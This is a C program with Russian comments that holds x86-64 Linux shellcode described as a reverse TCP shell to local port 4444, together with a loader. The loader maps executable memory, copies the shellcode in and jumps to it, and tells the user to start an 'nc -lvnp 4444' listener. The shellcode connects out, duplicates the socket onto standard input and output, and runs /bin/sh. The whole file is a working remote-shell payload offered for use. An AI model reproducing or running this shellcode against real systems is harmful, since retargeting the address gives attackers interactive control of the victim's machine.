#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>

// Reverse TCP Shell (127.0.0.1:4444)
// Полностью без NULL-байтов.
unsigned char shellcode[] = 
    "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
    "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x48\x89\xc7"
    "\x48\x31\xc0\x50\xbb\x7f\x01\x01\x01\xc1\xeb\x08\x53\x66\x68\x11"
    "\x5c\x66\x6a\x02\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48"
    "\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48"
    "\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89"
    "\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05";

int main() {
    printf("Shellcode length: %zu\n", sizeof(shellcode) - 1);
    
    // Выделяем память с правами на чтение, запись и ИСПОЛНЕНИЕ
    void *exec = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (exec == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Копируем шелл-код в выделенную память
    memcpy(exec, shellcode, sizeof(shellcode));

    // Настройка слушателя (подсказка)
    printf("1. Run this in another terminal: nc -lvnp 4444\n");
    printf("2. Press Enter here to execute...\n");
    getchar();

    // Прыжок на исполнение
    void (*run)() = (void (*)())exec;
    run();

    return 0;
}